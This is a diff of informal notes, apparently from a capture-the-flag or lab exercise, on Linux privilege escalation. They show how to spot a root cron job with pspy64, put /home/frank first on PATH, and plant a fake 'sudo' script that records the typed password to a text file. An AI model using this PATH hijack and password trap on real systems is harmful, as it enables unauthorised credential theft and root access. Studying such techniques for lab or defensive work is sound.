@@ -1,5 +1,5 @@
 Use pspy64 to check root cronjob
-
+---------------------------------
 2024/03/02 00:04:01 CMD: UID=0    PID=22987  | sudo /etc/shadow 
 
 /usr/bin/sudo is also suid.
@@ -7,15 +7,19 @@ Use pspy64 to check root cronjob
 In order to take advantage of /usr/bin/sudo, we must put /home/frank to the path
 
 export PATH=/home/frank:$PATH
-save the path to /.bashrc
+save the path to /.bashrc (save like that in .bashrc)
 
+PATH = /home/frank:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin
+
+
+Save that script with the filename called sudo
 
 #!/bin/bash
 read -sp ‘[sudo] password for frank:’ password
 echo $password > /home/frank/frankpassword.txt
 
-Save that command with the filename called sudo
-
 logout and login again.
+
+Because of saving in PATH (/home/frank is upfront) > Sudo script under /home/frank is the first one to run before the sudo command under /usr/local/sbin
 
 You will see the root password in frankpassword.txt file.
